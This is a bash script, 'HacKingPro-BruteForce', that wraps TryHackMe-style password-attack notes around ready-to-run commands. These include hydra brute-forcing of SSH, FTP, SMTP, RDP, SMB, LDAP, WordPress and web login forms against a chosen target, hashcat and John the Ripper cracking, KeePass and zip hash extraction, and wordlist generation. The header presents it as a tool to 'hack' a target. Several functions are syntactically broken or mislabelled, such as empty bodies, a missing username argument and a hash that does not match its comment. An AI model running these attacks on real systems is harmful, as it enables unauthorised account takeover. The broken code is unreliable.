#!/bin/sh
#!/bin/bash
#!/usr/bin/sh
#!/usr/bin/bash
#!/usr/bin/env sh
#!/usr/bin/env bash
#!/data/data/com.termux/files/usr/bin/sh
#!/data/data/com.termux/files/usr/bin/bash
###############################################################
#                  [ HacKingPro-BruteForce ]                  #
#-Info--------------------------------------------------------#
#    Enter Your Target, Hack Him, and Get Markdown Report     #
#-About-------------------------------------------------------#
#--╼▰[ Skils ]-╼▰[ MultiMan ]                                 #
#--╼▰[ Part of ]-╼▰[ HacKingPro ]                             #
#--╼▰[ Script Name ]-╼▰[ HacKingPro-BruteForce ]              #
#--╼▰[ Author ]-╼▰[ AnLoMinus ]-╼▰[ Leon Yaakobov ]           #
###############################################################
# CREDIT: To All World Creators free Scripts & Tools          #
# BIG THANX TO ALL COMUNITY THAT SHARE ALL THAT FREE          #
# GREAT SCRIPTS                                               #
# Location: Made With LOVE IN ISRAEL !                        #
###############################################################
#-Metadata----------------------------------------------------#
#--╼▰[ Version ]-╼▰[ 0.0.1 ]                                  #
#--╼▰[ Source ]-╼▰[ https://github.com/AnLoMinus/HacKingPro ] #
#--╼▰[ Created ]-╼▰[ 30-08-2022 ]                             #
#--╼▰[ Update ]-╼▰[ 14-10-2022 ]                              #
###############################################################
#--╼▰[ HacKingPro ]-╼▰[ BruteForce ]
#--╼▰[ HacKingPro ]-╼▰[ BruteForce ]-╼▰[ Wordlist ]-╼▰[ RockYou.txt ]
export RockYouPath="/usr/share/wordlists/rockyou.txt"

# This introduces the fundamental techniques to perform a successful password attack against various services and scenarios.

Print-PasswordAttacks(){
  echo "
  This room is an introduction to the types and techniques used in password attacks.
  We will discuss the ways to get and generate custom password lists.
  The following are some of the topics we will discuss:

  - Password profiling
  - Password attacks techniques
  - Online password attacks"

  echo "
  Password Cracking vs. Password Guessing

  - Password guessing is a technique used to target online protocols and services.
  Therefore, it's considered time-consuming and opens up the opportunity to generate logs for the failed login attempts.
  A password guessing attack conducted on a web-based system often requires a new request to be sent for each attempt, which can be easily detected.
  It may cause an account to be locked out if the system is designed and configured securely.

  - Password cracking is a technique performed locally or on systems controlled by the attacker.  "

  echo "
  Website that provide Default Passwords for various Products.

  # https://cirt.net/passwords
  # https://default-password.info/
  # https://datarecovery.com/rd/default-passwords/  "


}

WordlistsPro(){
  sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
  install_UserGen(){
    git clone https://github.com/therodri2/username_generator.git;
    cd username_generator; clear;
    python3 username_generator.py -h; sleep 3;
    echo "John Smith" > users.lst; clear;
    python3 username_generator.py -w users.lst
  }
  CombinedWordlists(){
    # Let's say that we have more than one wordlist. Then, we can combine these wordlists into one large file. This can be done as follows using cat:
    cat file1.txt file2.txt file3.txt > combined_list.txt
    # To clean up the generated combined list to remove duplicated words, we can use sort and uniq as follows:
    sort combined_list.txt | uniq -u > cleaned_combined_list.txt
  }
  CrunchPro(){
    # Crunch will now generate the following number of lines: 81
    # Crunch will now generate the following amount of data: 243 bytes
    crunch 2 2 01234abcd -o CrunchPro.txt

    # the file generated is 459 GB and contains 54875873536 words.
    crunch 8 8 0123456789abcdefABCDEF -o crunch.txt

    # @ - lower case alpha characters
    # , - upper case alpha characters
    # % - numeric characters
    # ^ - special characters including space
    crunch 6 6 -t pass%%
  }
  # CUPP - Common User Passwords Profiler
  git clone https://github.com/Mebus/cupp.git; cd cupp;
  clear;
  python3 cupp.py -i;
  CewlPro(){
    # To generate your wordlist using cewl against the website:
    cewl -m 8 -w clinic.lst https://$targetIP/
    # -l ftp we are specifying a single username, use-L for a username wordlist
    # -P Path specifying the full path of wordlist, you can specify a single password by using -p.
    # ftp://$targetIP the protocol and the IP address or the fully qualified domain name (FDQN) of the target.
  }
}

# Dictionary attack
HashCatPro(){
  # -a 0  sets the attack mode to a dictionary attack
  # -m 0  sets the hash mode for cracking MD5 hashes; for other types, run hashcat -h for a list of supported hashes.
  # f806fc5a2a0d5ba2471600758452799c this option could be a single hash like our example or a file that contains a hash or multiple hashes.
  # /usr/share/wordlists/rockyou.txt the wordlist/dictionary file for our attack
  hashcat -a 0 -m 0 8d6e34f987851aa599257d3831a1af040886842f /usr/share/wordlists/rockyou.txt # --show


  # Brute-Force attack
  # Now let's apply the same concept to crack the following MD5 hash: 05A5CF06982BA7892ED2A6D38FE832D6 a four-digit PIN number.
  hashcat -a 3 -m 0 05A5CF06982BA7892ED2A6D38FE832D6 ?d?d?d?d

  # -a 3  sets the attacking mode as a brute-force attack
  # ?d?d?d?d the ?d tells hashcat to use a digit. In our case, ?d?d?d?d for four digits starting with 0000 and ending at 9999
  # --stdout print the result to the terminal
  hashcat -a 3 ?d?d?d?d --stdout
}

HydraPro(){
  export RockYouPath="/usr/share/wordlists/rockyou.txt"
  # export UsersListPath="/usr/share/wordlists/.txt"
  Hydra-HTTPLoginPagesPro(){
    read -p "Target IP: " targetIP
    read -p "Login name: " username
    read -p "Pass List: " passlist
    echo ""
    echo 'hydra -l $username -P $passlist $targetIP http-post-form "/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php" -f -t 24 -V -I'
    hydra -l $username -P $passlist $targetIP http-post-form "/login-post/index.php:username=^USER^&password=^PASS^"


    hydra -L $UsersListPath -P $RockYouPath $targetIP http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f
    # -l admin  we are specifying a single username, use-L for a username wordlist
    # -P Path specifying the full path of wordlist, you can specify a single password by using -p.
    # 10.10.x.x the IP address or the fully qualified domain name (FQDN) of the target.
    # http-get-form the type of HTTP request, which can be either http-get-form or http-post-form.
    # Next, we specify the URL, path, and conditions that are split using :
    # login-get/index.php the path of the login page on the target webserver.
    # username=^USER^&password=^PASS^ the parameters to brute-force, we inject ^USER^ to brute force usernames and ^PASS^ for passwords from the specified dictionary.
    # -f to stop the brute-forcing attacks after finding a valid username and password



  }

  # Hydra HTTP Basic Authenication Brute Force
  Hydra-HTTPAuthenication_ALMP(){
    hydra -L $UsersListPath -P $RockYouPath $targetIP -s $port -f http-get /
  }
  # Hydra brute force against SNMP
  Hydra-SNMP_ALMP(){
    hydra -P $RockYouPath -v $targetIP snmp
  }
  # Hydra FTP known user and rockyou password list
  Hydra-FTP_ALMP(){
    hydra -t 1 -L $UsersListPath -P $RockYouPath -vV $targetIP ftp
    hydra -l ftp -P $RockYouPath ftp://$targetIP
    # -l ftp we are specifying a single username, use-L for a username wordlist
    # -P Path specifying the full path of wordlist, you can specify a single password by using -p.
    # ftp://10.10.x.x the protocol and the IP address or the fully qualified domain name (FDQN) of the target.
  }
  Hydra-SSH_Lists_Users_And_Pass_ALMP(){
  }
  xXxX(){
  }
  Hydra-SSH_User_ALMP(){
    # Hydra SSH Against Known username on port 22
    hydra $targetIP -s 22 ssh -l -P $RockYouPath
    # Hydra SSH using a known password and a username list
    hydra -v -V -u -L $LoginListPath -p "" -t 1 -u $targetIP ssh
    # Hydra SSH using list of users and passwords
    hydra -v -V -u -L $LoginListPath -P $RockYouPath -t 1 -u $targetIP ssh

    hydra -L $RockYouPath -P $RockYouPath ssh://$targetIP -v
  }
  # Hydra POP3 Brute Force
  Hydra-POP3_ALMP(){
    hydra -l $targetUserName -P $RockYouPath -f $targetIP pop3 -V
  }
  # Hydra SMTP Brute Force
  Hydra-SMTP_ALMP(){
    hydra -L $LoginListPath -P $RockYouPath  smtp://$targetIP -V
    hydra -L $LoginListPath -P $RockYouPath  smtp://$targetIP:$targetPORT -V
    hydra -l pittman@clinic.thmredteam.com -P $RockYouPath smtp://$targetIP -v
    smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/cirt-default-usernames.txt -t $targetIP
  }
  # Hydra attack http get 401 login with a dictionary
  xXxX(){
    hydra -L ./webapp.txt -P ./webapp.txt $targetIP http-get /admin
  }
  # Hydra attack Windows Remote Desktop with rockyou
  Hydra-RDP_ALMP(){
    hydra -t 1 -V -f -l administrator -P $RockYouPath rdp://$targetIP
  }
  # Hydra brute force SMB user with rockyou
  Hydra-SMB__ALMP(){
    hydra -t 1 -V -f -l administrator -P $RockYouPath $targetIP smb
  }
  # SMB Brute Forcing
  Hydra-SMB_ALMP(){
    hydra -L usernames.txt -P $RockYouPath $targetIP smb -V -f
  }
  # Hydra brute force a Wordpress admin login
  Hydra-WordpressAdminLogin_(){
    hydra -l username -P $RockYouPath -f $targetIP http-post-form "/login.php/:username=^USER^&password=^PASS^:F=incorrect"
  }
  # READ THE SOURCE
  xXxX(){
    hydra -l admin -P $RockYouPath $targetIP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
  }
  # LDAP Brute Forcing
  Hydra-LDAP_ALMP(){
    hydra -L users.txt -P $RockYouPath $targetIP ldap2 -V -f
  }
}

Rule-Based-Attacks(){
  # For this attack, we can expand our wordlist using either hashcat or John the ripper.
  JohnTheRipperPro(){
    Installing-JohnTheRipper(){
      # 1. Installing from the source
      git clone https://github.com/openwall/john.git
      cd john; cd src; ./configure;
      make;
      make install;
      cd ..; cd run; ./john;

      # 2. Installing from the package
      sudo apt install john

    }

    # 1. Cracking a zip/rar password-protected file
    # Cracking a zip or rar file password is done using the same approach.
    zip2john Test.zip > hash.txt
    john --format=zip hash.txt
    read_List_Rules_John.conf(){
      # You can read /etc/john/john.conf and look for List.Rules to see all the available rules:
      cat /etc/john/john.conf | grep "List.Rules:" | cut -d"." -f3 | cut -d":" -f2 | cut -d"]" -f1 | awk NF

    }
    # We can see that we have many rules that are available for us to use.
    # We will create a wordlist with only one password containing the string tryhackme, to see how we can expand the wordlist.
    # Let's choose one of the rules, the best64 rule, which contains the best 64 built-in John rules, and see what it can do!
    echo "tryhackme" > /tmp/single-password-list.txt;
    john --wordlist=/tmp/single-password-list.txt --rules=best64 --stdout # | wc -l
    # --wordlist= to specify the wordlist or dictionary file.
    # --rules to specify which rule or rules to use.
    # --stdout to print the output to the terminal.
    # | wc -l  to count how many lines John produced.

    john --wordlist=/tmp/single-password-list.txt --rules=KoreLogic --stdout | grep "Tryh@ckm3"

    echo '[List.Rules:THM-Password-Attacks]
    Az"[0-9]" ^[!@#$]'  >> /etc/john/john.conf
    echo "password" > /tmp/single.lst

  }
}


# How to crack a KeePass Database file
Crack_KeePass_Database(){
  # Open a terminal and navigate to the location of the file.
  # Type in the following command to retrieve the hash and put it in a file called keepasshash.txt
  keepass2john $Database_kdbx > $Keepasshash_txt


  # Cracking the KeePass database with John the Ripper
  # Type in the following command to start John to crack the password
  john --wordlist=/usr/share/wordlists/rockyou.txt $Keepasshash_txt

  # Cracking Keepass database file with Hashcat and no Dictionary file
  # First, we need to open the hash file we have created and remove the name of the database so hashcat can handle the hash file
  #
  # Now remove the name of the DB, then exit and save the file
  nano $Keepasshash_txt
}
